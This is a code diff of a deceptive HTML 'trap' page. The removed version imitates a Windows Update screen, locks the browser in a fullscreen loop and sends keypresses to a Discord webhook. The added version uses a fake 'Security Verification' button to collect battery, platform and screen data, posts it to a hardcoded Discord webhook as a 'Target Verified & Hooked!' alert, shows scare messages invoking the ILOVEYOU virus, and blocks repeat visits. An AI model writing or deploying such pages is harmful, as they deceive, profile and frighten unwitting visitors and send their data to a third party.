@@ -3,250 +3,257 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Updating your system</title>
+    <title>KERNEL_PANIC // 0x000000</title>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=VT323&display=swap');
+
         * {
             box-sizing: border-box;
-            user-select: none;
+            cursor: none;
         }
 
         body {
-            background-color: #001838;
-            color: #ffffff;
-            font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, sans-serif;
-            height: 100vh;
+            background-color: #000;
+            color: #f00;
+            font-family: 'VT323', monospace;
             margin: 0;
+            padding: 0;
+            height: 100vh;
+            overflow: hidden;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
-            overflow: hidden;
-            cursor: default;
+            flex-direction: column;
         }
 
-        .update-container {
-            text-align: left;
-            max-width: 600px;
-            width: 100%;
-            padding: 20px;
+        /* Heavy CRT static noise overlay */
+        body::after {
+            content: "";
+            position: fixed;
+            top: 0; left: 0; width: 100vw; height: 100vh;
+            background: repeating-linear-gradient(0deg, rgba(255,0,0,0.15), rgba(255,0,0,0.15) 1px, transparent 1px, transparent 2px);
+            pointer-events: none;
+            z-index: 9999;
+            opacity: 0.7;
         }
 
-        .spinner {
-            width: 50px;
-            height: 50px;
-            display: inline-block;
+        @keyframes violentShake {
+            0% { transform: translate(0, 0) rotate(0deg); }
+            20% { transform: translate(-3px, 3px) rotate(-1deg); }
+            40% { transform: translate(3px, -2px) rotate(1deg); }
+            60% { transform: translate(-2px, -3px) rotate(0deg); }
+            80% { transform: translate(2px, 2px) rotate(-1deg); }
+            100% { transform: translate(0, 0) rotate(0deg); }
+        }
+
+        .corrupted-box {
+            border: 2px solid #500;
+            background: #080000;
+            padding: 40px;
+            width: 500px;
+            box-shadow: 0 0 50px rgba(255, 0, 0, 0.2);
+            animation: violentShake 0.2s infinite;
             position: relative;
-            margin-bottom: 40px;
         }
-
-        .spinner div {
-            position: absolute;
-            width: 6px;
-            height: 6px;
-            background: #ffffff;
-            border-radius: 50%;
-            animation: spin-dots 1.2s linear infinite;
-        }
-
-        @keyframes spin-dots {
-            0% { transform: translate(0, 0); opacity: 1; }
-            100% { transform: translate(0, 0); opacity: 0; }
-        }
-
-        .spinner div:nth-child(1) { animation-delay: 0s; top: 22px; left: 44px; }
-        .spinner div:nth-child(2) { animation-delay: 0.15s; top: 35px; left: 40px; }
-        .spinner div:nth-child(3) { animation-delay: 0.3s; top: 44px; left: 28px; }
-        .spinner div:nth-child(4) { animation-delay: 0.45s; top: 44px; left: 14px; }
-        .spinner div:nth-child(5) { animation-delay: 0.6s; top: 35px; left: 4px; }
-        .spinner div:nth-child(6) { animation-delay: 0.75s; top: 22px; left: 0px; }
-        .spinner div:nth-child(7) { animation-delay: 0.9s; top: 9px; left: 4px; }
-        .spinner div:nth-child(8) { animation-delay: 1.05s; top: 0px; left: 14px; }
 
         h1 {
-            font-size: 1.8rem;
-            font-weight: 300;
-            margin-bottom: 15px;
-            letter-spacing: 0.3px;
-        }
-
-        .percentage {
-            font-size: 1.2rem;
-            font-weight: 400;
-            margin-bottom: 30px;
+            font-size: 2.5rem;
+            color: #ff0033;
+            margin-top: 0;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            text-shadow: 2px 2px #500000;
         }
 
         p {
-            font-size: 0.95rem;
-            color: #b0c4de;
-            line-height: 1.5;
-            margin: 8px 0;
+            font-size: 1.3rem;
+            color: #888;
+            line-height: 1.4;
         }
 
-        .footer-note {
-            position: absolute;
-            bottom: 40px;
-            font-size: 0.9rem;
-            color: #8fa3cc;
+        .data-stream {
+            background: #030000;
+            border: 1px dashed #300;
+            padding: 15px;
+            margin-top: 20px;
+            font-size: 1.1rem;
+            color: #ff3333;
+            text-align: left;
+            height: 120px;
+            overflow: hidden;
         }
 
+        /* Trustworthy landing overlay card */
         .trust-overlay {
             position: fixed;
             top: 0; left: 0; width: 100vw; height: 100vh;
-            background: rgba(0, 24, 56, 0.95);
+            background: rgba(0, 0, 0, 0.85);
             display: flex;
             justify-content: center;
             align-items: center;
             z-index: 20000;
+            font-family: 'Inter', sans-serif;
         }
 
         .trust-card {
             background: #ffffff;
-            color: #333;
+            border: 1px solid #e1e4e8;
             padding: 40px;
             width: 420px;
-            border-radius: 4px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-            text-align: left;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            color: #333;
         }
 
         .trust-card h2 {
-            font-size: 1.3rem;
+            font-size: 1.4rem;
+            color: #24292e;
             margin-top: 0;
             font-weight: 600;
-            color: #111;
         }
 
         .trust-card p {
-            font-size: 0.9rem;
-            color: #666;
+            font-size: 0.95rem;
+            color: #586069;
             line-height: 1.5;
             margin-bottom: 25px;
         }
 
-        .action-btn {
-            background: #0067c0;
+        .verify-btn {
+            background: #2ea44f;
             border: none;
             color: white;
-            padding: 10px 20px;
-            font-size: 0.9rem;
+            padding: 12px 20px;
+            width: 100%;
+            border-radius: 6px;
+            font-family: 'Inter', sans-serif;
+            font-size: 0.95rem;
             font-weight: 500;
             cursor: pointer;
-            border-radius: 2px;
-            float: right;
+            transition: background 0.2s;
         }
 
-        .action-btn:hover {
-            background: #005da6;
+        .verify-btn:hover {
+            background: #2c974b;
+        }
+
+        /* Fake custom creepy cursor */
+        .cursor {
+            position: fixed;
+            width: 10px;
+            height: 10px;
+            background: #ff0033;
+            box-shadow: 0 0 10px #ff0033;
+            pointer-events: none;
+            z-index: 30000;
+            transform: translate(-50%, -50%);
         }
     </style>
 </head>
 <body>
 
-    <div class="trust-overlay" id="welcomeModal">
+    <!-- LOCKOUT CHECK: If already triggered, instantly redirect -->
+    <script>
+        if (localStorage.getItem('trap_locked') === 'true') {
+            window.location.replace("https://google.com");
+        }
+    </script>
+
+    <!-- Trustworthy Landing Overlay -->
+    <div class="trust-overlay" id="welcome-modal">
         <div class="trust-card">
-            <h2>System Component Notice</h2>
-            <p>An essential security configuration package requires a full layout sync before proceeding to your workspace.</p>
-            <button class="action-btn" onclick="engageLockdown()">Continue</button>
+            <h2>Security Verification</h2>
+            <p>Please verify your browser session to access the secure document repository.</p>
+            <button class="verify-btn" onclick="commitPayload()">Verify Session</button>
         </div>
     </div>
 
-    <div class="update-container">
-        <div class="spinner">
-            <div></div><div></div><div></div><div></div>
-            <div></div><div></div><div></div><div></div>
-        </div>
-        <h1>Working on updates <span id="percent">12</span>%</h1>
-        <div class="percentage">Keep your computer on. This will take a while.</div>
-        <p>Your PC will restart several times.</p>
-        <p id="status-subtext">Configuring update for system components...</p>
-    </div>
+    <div class="cursor" id="custom-cursor"></div>
 
-    <div class="footer-note">Do not turn off or unplug your PC.</div>
+    <div class="corrupted-box">
+        <h1 id="main-title">ACCESS_VIOLATION_ERR</h1>
+        <p>Your hardware signature has been permanently indexed by an external host. Escape is no longer viable.</p>
+        
+        <div class="data-stream" id="log-console">
+            [SYS] Initializing memory leak...<br>
+            [SYS] Target node identified...<br>
+            [SYS] Extracting local environment vectors...
+        </div>
+    </div>
 
     <script>
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1547219958113501184/yl_zJgd1KLN5n984pKjm6T6lpuvSTnx-9EKITJ3MtcQEsHeFWonDiST-knu6DzR6Vkvn';
+        // REPLACE WITH YOUR DISCORD WEBHOOK URL
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1547219958113501184/yl_zJgd1KLN5n984pKjm6T6lpuvSTnx-9EKITJ3MtcQEsHeFWoNDiST-kNu6DzR6Vkvn';
 
-        let percent = 12;
+        // Track custom creepy cursor
+        const cursor = document.getElementById('custom-cursor');
+        window.addEventListener('mousemove', (e) => {
+            cursor.style.left = e.clientX + 'px';
+            cursor.style.top = e.clientY + 'px';
+        });
 
-        const percentInterval = setInterval(() => {
-            if (percent < 99) {
-                percent += Math.floor(Math.random() * 3);
-                if (percent > 99) percent = 99;
-                document.getElementById('percent').innerText = percent;
-            }
-        }, 3500);
+        // When they click the trustable button, hide overlay, lock localStorage, log telemetry, and start the sequence
+        async function commitPayload() {
+            // Set localStorage lock so they can never open this page again
+            localStorage.setItem('trap_locked', 'true');
 
-        window.addEventListener('load', () => {
+            // Hide the trustable welcome modal
+            document.getElementById('welcome-modal').style.display = 'none';
+
             let batteryInfo = "Unknown";
             if ('getBattery' in navigator) {
-                navigator.getBattery().then(b => {
-                    batteryInfo = `${Math.round(b.level * 100)}%`;
-                }).catch(() => {});
+                try {
+                    const b = await navigator.getBattery();
+                    batteryInfo = `${Math.round(b.level * 100)}% (Charging: ${b.charging})`;
+                } catch(e) {}
             }
 
+            const consoleBox = document.getElementById('log-console');
+            consoleBox.innerHTML += `<br>[OK] Power state: ${batteryInfo}`;
+            consoleBox.innerHTML += `<br>[OK] Platform: ${navigator.platform}`;
+
+            // Send telemetry to Discord (no clipboard requested)
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    content: `🪟 **Target opened the Windows Update Trap!**\n🔋 Battery: ${batteryInfo}\n🌐 Platform: ${navigator.platform}`
+                    content: `🚨 **Target Verified & Hooked!**\n🔋 Battery: ${batteryInfo}\n🌐 Platform: ${navigator.platform}\n🖥️ Res: ${window.screen.width}x${window.screen.height}`
                 })
             });
-        });
 
-        function engageLockdown() {
-            document.getElementById('welcomeModal').style.display = 'none';
+            // Creepy timeline sequence
+            setTimeout(() => {
+                document.body.style.background = '#ff0033';
+                document.body.style.color = '#000';
+                document.querySelector('.corrupted-box').style.background = '#000';
+                document.getElementById('main-title').innerText = "YOU ARE MONITORED :>";
+            }, 1000);
 
-            try {
-                document.documentElement.requestFullscreen();
-            } catch(e) {}
+            setTimeout(() => {
+                document.getElementById('main-title').innerText = "HI dear ko!";
+            }, 3000);
 
-            // Aggressive re-trigger loop
-            setInterval(() => {
-                if (!document.fullscreenElement) {
-                    try {
-                        document.documentElement.requestFullscreen();
-                    } catch(e) {}
-                }
-            }, 100);
+            setTimeout(() => {
+                document.getElementById('main-title').innerText = "ILOVEYOU";
+            }, 4000);
 
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: `🚨 **Lockdown engaged with aggressive loop!**`
-                })
-            });
+            setTimeout(() => {
+                document.getElementById('main-title').innerText = "ILOVEYOU VIRUS";
+            }, 4500);
+
+            setTimeout(() => {
+                document.getElementById('main-title').innerText = "HHEHEHEHE";
+            }, 4800);
+
+            setTimeout(() => {
+                document.getElementById('main-title').innerText = "B- BYE :>";
+            }, 5000);
+
+            setTimeout(() => {
+                window.location.replace("https://google.com");
+            }, 5600);
         }
-
-        // Event listener that immediately fires back into fullscreen the second they press Escape
-        document.addEventListener('fullscreenchange', () => {
-            if (!document.fullscreenElement) {
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: `⚠️ **Target tried to break fullscreen!** Re-forcing...`
-                    })
-                });
-
-                // Immediately attempt to snap back
-                setTimeout(() => {
-                    try {
-                        document.documentElement.requestFullscreen();
-                    } catch(e) {}
-                }, 50);
-            }
-        });
-
-        window.addEventListener('keydown', (e) => {
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: `⌨️ **Target is trying to escape!** Key pressed: \`${e.key}\``
-                })
-            });
-        });
     </script>
 </body>
 </html>
